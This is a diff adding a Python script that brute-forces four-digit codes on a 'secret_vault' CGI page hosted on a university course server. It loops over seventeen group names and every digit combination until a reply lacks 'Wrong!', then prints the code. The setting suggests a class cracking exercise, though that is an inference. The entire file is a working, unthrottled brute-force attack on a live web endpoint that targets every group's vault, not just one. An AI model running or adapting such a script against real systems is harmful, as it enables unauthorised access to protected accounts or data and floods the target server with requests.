@@ -1,0 +1,34 @@
+import urllib.request, time
+
+page = ""
+success = "False"
+
+start = time.time()
+for i in range(1,18):
+    def hack(i):
+        groupnum = ('{num:02d}'.format(num=i))
+        for dig1 in range(0,10):
+            for dig2 in range(0,10):
+                for dig3 in range(0,10):
+                    for dig4 in range(0,10):
+                        url= "http://cgi.soic.indiana.edu/~ebigalee/secret_vault.cgi?"
+                        url += "groupname=Group"+str(groupnum)+"&num1="+str(dig1)+"&num2="+str(dig2)+"&num3="+str(dig3)+"&num4="+str(dig4)
+                        web_page = urllib.request.urlopen(url)
+                        lines = web_page.read().decode(errors="replace")
+                        web_page.close()
+                        #print(lines)
+                        #print(url)
+                        if "Wrong!" not in lines:
+                            print(url)
+                            print("Digit 1: "+str(dig1))
+                            print("Digit 2: "+str(dig2))
+                            print("Digit 3: "+str(dig3))
+                            print("Digit 4: "+str(dig4))
+                            return
+    hack(i)
+
+stop = time.time()     
+print(stop-start)                     
+
+                    
+                
